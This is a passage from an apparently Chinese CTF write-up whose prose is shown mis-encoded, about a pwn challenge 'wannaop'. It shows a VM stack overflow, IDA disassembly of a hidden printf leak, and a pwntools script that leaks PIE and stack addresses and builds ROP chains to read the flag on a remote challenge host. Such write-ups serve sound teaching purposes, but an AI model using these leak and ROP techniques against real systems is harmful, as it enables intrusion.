style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">vm </span><span style="color:#CB7676">*</span><span style="color:#BD976A">a1</span><span style="color:#666666">,</span><span style="color:#CB7676"> int</span><span style="color:#BD976A"> a2</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> result</span><span style="color:#666666">;</span><span style="color:#758575DD"> // eax</span><br><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A"> a1</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">sp</span><span style="color:#CB7676"> </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 343</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#4D9375">    return</span><span style="color:#80A665"> puts</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">error!</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  ++</span><span style="color:#BD976A">a1</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">sp</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  result </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#CB7676">int</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">a1</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  *</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">_DWORD </span><span style="color:#CB7676">*</span><span style="color:#4d9375">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#BD976A">a1</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">stack</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">4</span><span style="color:#CB7676"> *</span><span style="color:#BD976A"> a1</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">sp</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> a2</span><span style="color:#666666">;</span><span style="color:#758575DD">       // stack overflow</span><br><span style="color:#4D9375">  return</span><span style="color:#DBD7CAEE"> result</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>å…¶å®ä¸€å¼€å§‹æ¯”è¾ƒå¥½æƒ³åˆ°çš„æ˜¯ <code class="inline-code">push</code> æ“ä½œå¯ä»¥æº¢å‡ºï¼Œæ­£æ•°æº¢å‡ºç”šè‡³å¯ä»¥æ”¹åˆ° <code class="inline-code">sp</code> æŒ‡é’ˆï¼Œç„¶åæŠŠ <code class="inline-code">sp</code> æ”¹åˆ°è´Ÿæ•°ï¼Œå°±å¯ä»¥æ§åˆ¶æ‰§è¡Œæµï¼Œå½“ç„¶ç›´æ¥æ­£å‘æº¢å‡ºä¹Ÿå¯ä»¥ã€‚</p>
<p>ä½†æ˜¯æ¯”è¾ƒè›‹ç–¼çš„æ˜¯é¢˜ç›®æä¾›çš„æ“ä½œçœ‹åæ±‡ç¼–ï¼Œä¼šæ„Ÿè§‰é¢˜ç›®æ²¡ç»™ä»»ä½•çš„ leak æ“ä½œï¼Œbut ä½ ä¼šå‘ç°ç¨‹åºçš„ bss æ®µä¸Šæœ‰ä¸ª <code class="inline-code">%d</code>ï¼Œäº¤å‰å¼•ç”¨ä¸€ä¸‹å‘ç°åŠŸèƒ½ 5 é‡Œè—äº†ä¸€ä¸ª <code class="inline-code">printf</code>ï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²ã€‚ã€‚ã€‚</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">.text:00000000000015C4 loc_15C4:                               ; CODE XREF: solve+41â†‘j
.text:00000000000015C4                                         ; DATA XREF: .rodata:jpt_14F2â†“o
.text:00000000000015C4                 call    $+5             ; jumptable 00000000000014F2 case 5
.text:00000000000015C9                 lea     r8, loc_15D5
.text:00000000000015D0                 mov     [rsp+28h+var_28], r8
.text:00000000000015D4                 retn
.text:00000000000015D5 ; ---------------------------------------------------------------------------
.text:00000000000015D5
.text:00000000000015D5 loc_15D5:                               ; DATA XREF: solve+118â†‘o
.text:00000000000015D5                 cmp     [rbp+var_20], 0FFh
.text:00000000000015DC                 jg      short loc_162F
.text:00000000000015DE                 mov     rdx, [rbp+var_18]
.text:00000000000015E2                 mov     eax, [rbp+var_20]
.text:00000000000015E5                 cdqe
.text:00000000000015E7                 movzx   eax, byte ptr [rdx+rax+404h]
.text:00000000000015EF                 movzx   eax, al
.text:00000000000015F2                 mov     esi, eax
.text:00000000000015F4                 lea     rdi, aD         ; "%d\n"
.text:00000000000015FB                 mov     eax, 0
.text:0000000000001600                 call    _printf
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">.text:00000000000015C4 loc_15C4:                               ; CODE XREF: solve+41â†‘j
.text:00000000000015C4                                         ; DATA XREF: .rodata:jpt_14F2â†“o
.text:00000000000015C4                 call    $+5             ; jumptable 00000000000014F2 case 5
.text:00000000000015C9                 lea     r8, loc_15D5
.text:00000000000015D0                 mov     [rsp+28h+var_28], r8
.text:00000000000015D4                 retn
.text:00000000000015D5 ; ---------------------------------------------------------------------------
.text:00000000000015D5
.text:00000000000015D5 loc_15D5:                               ; DATA XREF: solve+118â†‘o
.text:00000000000015D5                 cmp     [rbp+var_20], 0FFh
.text:00000000000015DC                 jg      short loc_162F
.text:00000000000015DE                 mov     rdx, [rbp+var_18]
.text:00000000000015E2                 mov     eax, [rbp+var_20]
.text:00000000000015E5                 cdqe
.text:00000000000015E7                 movzx   eax, byte ptr [rdx+rax+404h]
.text:00000000000015EF                 movzx   eax, al
.text:00000000000015F2                 mov     esi, eax
.text:00000000000015F4                 lea     rdi, aD         ; "%d\n"
.text:00000000000015FB                 mov     eax, 0
.text:0000000000001600                 call    _printf
</code></pre></div>
<p>emm æ„Ÿè§‰æœ‰ç‚¹é€†å¤©äº†ï¼Œé‚£å°±å¾ˆç®€å•äº†ï¼Œæ³„æ¼åœ°å€ç„¶ååˆ©ç”¨é¢˜ç›®ç»™çš„ä»»æ„å†™åŸè¯­å’Œæ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œæ³¨æ„å¦‚æœç›´æ¥å†™ orw é•¿åº¦ä¼šçˆ†ï¼Œæ‰€ä»¥å…ˆ rereadï¼Œæ‡’å¾—æ ˆè¿ç§»äº†ã€‚</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./wannaop</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">173.33.5.48</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 9999</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">wanna op: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> push</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> op </span><span style="color:#AB5959">==</span><span style="color:#B5695977"> "</span><span style="color:#B56959">-</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">-</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    else</span><span style="color:#999999">:</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">op</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> pop</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">op</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> add</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> sub</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> xor</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> store</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">op</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> ret</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> leak</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">op</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    b </span><span style="color:#999999">=</span><span style="color:#393A34"> io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">b</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> write64</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    push</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffffff</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    push</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">addr </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffffffff</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># vm: 0x7fffffffcb10</span><br><span style="color:#A0ADA0"># sp: 0x7fffffffd0e0</span><br><br><br><span style="color:#393A34">res </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    res </span><span style="color:#999999">+=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">leak</span><span style="color:#1e754f">(</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">41c</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> i</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pie_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">res</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1734</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"pie_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pie_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">res </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    res </span><span style="color:#999999">+=</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">leak</span><span style="color:#1e754f">(</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">41c</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> i </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 8</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">stack_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">res</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"stack_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stack_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pie_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000000017c3</span><br><span style="color:#393A34">pop_rsi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pie_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000000017c1</span><br><span style="color:#393A34">target_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">608</span><br><span style="color:#393A34">puts_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> pie_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10f0</span><br><span style="color:#393A34">main_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> pie_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1692</span><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">256</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    push</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">push</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">145</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write64</span><span style="color:#2993a3">(</span><span style="color:#393A34">target_addr</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write64</span><span style="color:#2993a3">(</span><span style="color:#393A34">puts_addr</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write64</span><span style="color:#2993a3">(</span><span style="color:#393A34">main_addr</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">ret</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">libc_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">63162</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">pop_rsi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000002601f</span><br><span style="color:#393A34">pop_rdx_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000015fae6</span><br><span style="color:#393A34">pop_rax_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000036174</span><br><span style="color:#393A34">syscall </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000000630a9</span><br><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">address </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr</span><br><span style="color:#393A34">pop_rax_rdx_rbx_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000015fae5</span><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">254</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    push</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">push</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">616c662f</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">push</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">67</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">push</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">145</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">reread </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">70</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_rdx_rbx_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">300</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">orw </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">f8</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 257</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">orw </span><span style="color:#999999">+=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">400</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">orw </span><span style="color:#999999">+=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">400</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">orw </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#393A34">orw</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># print(res)</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#393A34"> reread</span><span style="color:#999999">:</span><br><span style="color:#393A34">    write64</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">ret</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#998418">print</span><span style="color:#2993a3">(</span><span style="color:#998418">hex</span><span style="color:#1e754f">(</span><span style="color:#393A34">stack_addr</span><span style="color:#1e754f">)</span><span 